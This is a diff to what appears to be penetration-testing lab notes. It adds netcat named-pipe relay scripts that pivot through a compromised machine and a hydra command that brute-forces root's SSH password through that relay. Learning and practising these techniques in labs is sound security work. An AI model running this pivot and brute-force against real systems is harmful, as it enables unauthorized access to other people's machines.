@@ -521,7 +521,7 @@ We run nmap from this machine to discover opened ports on 172.16.50.224
 {% tabs %}
 {% tab title="nmap \(on 172.16.50.224\) " %}
 ```bash
-nmap 172.16.50.224 -sV -n -v -Pn -p- -T4 -oX portScan.xml
+nmap 172.16.50.222 -sV -n -v -Pn -p- -T4 -oX portScan.xml
 ```
 {% endtab %}
 
@@ -552,19 +552,45 @@ nmap -sV -n -v -Pn -p- -T4 -oX portScan.xml --min-rate=5000 172.16.50.222
 {% endtab %}
 {% endtabs %}
 
+Use netcat to pivot an `hydra` attack for the `ssh` service on `172.16.50.222` :
+
 {% tabs %}
-{% tab title="Listener Relay on Attacker Machine" %}
+{% tab title=" Attacker Machine \(listener.sh\)" %}
 ```bash
-~$ cd /tmp; mknod backpipe p
-~$ nc -lvp 111 0<backpipe | nc -lvp 222 | tee backpipe
+#!/bin/bash
+# Listener Relay
+
+cd /tmp; mknod backpipex p
+while true; do
+    nc -lvp 111 0<backpipex | nc -lvp 222 | tee backpipex
+done;
+
 ```
 {% endtab %}
 
-{% tab title="Client to Client Relay on Pivot Machine" %}
+{% tab title="Pivot Machine \(c2c-relay.sh\)" %}
 ```bash
-cd /tmp; mknod backpipe p 
-nc 172.16.50.222 2 0<backpipe | nc 10.13.37.11 111 | tee backpipe   
+#!/bin/bash
+# Client to Client Relay on
+
+cd /tmp; mknod backpipex p 
+while true; do
+    nc 172.16.50.222 22 0<backpipex | nc 10.13.37.11 111 | tee backpipex   
+done;
+
+```
+{% endtab %}
+
+{% tab title="Attacker Machine \(Attack\)" %}
+```
+hydra -s 222 -V -l root -P /usr/share/wordlists/dirb/small.txt 127.0.0.1 -t 4 ssh
 ```
 {% endtab %}
 {% endtabs %}
+
+## References
+
+{% embed url="https://security.stackexchange.com/questions/188921/use-netcat-to-pivot" %}
+
+
 
